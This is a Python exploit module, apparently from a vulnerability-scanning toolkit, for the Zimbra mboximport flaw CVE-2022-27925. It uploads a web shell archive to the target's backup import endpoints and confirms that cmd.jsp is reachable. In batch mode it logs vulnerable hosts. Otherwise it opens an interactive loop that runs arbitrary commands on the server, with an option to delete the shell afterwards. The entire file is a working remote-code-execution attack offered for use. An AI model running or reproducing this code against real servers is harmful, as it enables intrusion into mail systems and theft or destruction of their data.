import requests
from urllib3.exceptions import InsecureRequestWarning
from pub.com.reqset import ReqSet
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)



class Cve_2022_27925Poc2:
    def exploit(self,url, endpoint):
        headers = {
            'User-Agent': self.header,
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        msg = """
        Exploit was successful!

        Send "exit" to exit the shell
        Send "deleteme" to delete the shell
        """
        with open("./cve/Zimbra/webshell.zip", 'rb') as payload:

            try:
                req = requests.post(url + endpoint, timeout=60, data=payload,
                                    verify=self.ssl,proxies=self.proxy, headers=headers)

                if req.status_code == 401:
                    check_req = requests.get(url + "/zimbraAdmin/cmd.jsp")
                    if check_req.status_code == 200:
                        OutPrintInfoSuc("Zimbra", f"存在Zimbra-Rce漏洞 {url}/zimbraAdmin/cmd.jsp")
                        if not self.batch:
                            OutPrintInfoSuc("Zimbra",msg)
                        else:
                            with open("./result/zimbra_2022_27925.txt","a") as w:
                                w.write(f"{url}/zimbraAdmin/cmd.jsp\n")
                            # print(msg)
                        if not self.batch:
                            while True:
                                command = input(">>> ")
                                if command == "exit":
                                    break
                                if command == "deleteme":
                                    requests.get(url + "/zimbraAdmin/cmd.jsp?cmd=rm -rf /opt/zimbra/jetty/webapps/zimbraAdmin/cmd.jsp")
                                    break
                                req = requests.get(url + "/zimbraAdmin/cmd.jsp?cmd=" + command,verify=self.ssl, proxies=self.proxy, headers=headers)
                                try:
                                    OutPrintInfoSuc("Zimbra", req.text.split('<BR>')[1].split('</pre>')[0].strip())
                                except:
                                    OutPrintInfo("Zimbra", "Command failed to execute")


                        return True

            except Exception as e:
                if not self.batch:
                    OutPrintInfo("Zimbra",e)


    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        self.header = target["header"]
        proxy = target["proxy"]


        _, self.proxy = ReqSet(proxy=proxy, bwork=self.batch)

        if not self.batch:
            OutPrintInfo("Zimbra","开始检测CVE-2022-27925-POC2...")
        endpoints = ["/service/extension/backup/mboximport?account-name=admin&account-status=1&ow=cmd",
                     "/service/extension/backup/mboximport?account-name=admin&ow=2&no-switch=1&append=1"]
        for endpoint in endpoints:
            flag = self.exploit(url, endpoint)
            if flag:
                break
        if not self.batch:
            OutPrintInfo("Zimbra","CVE-2022-27925-POC2检测结束")
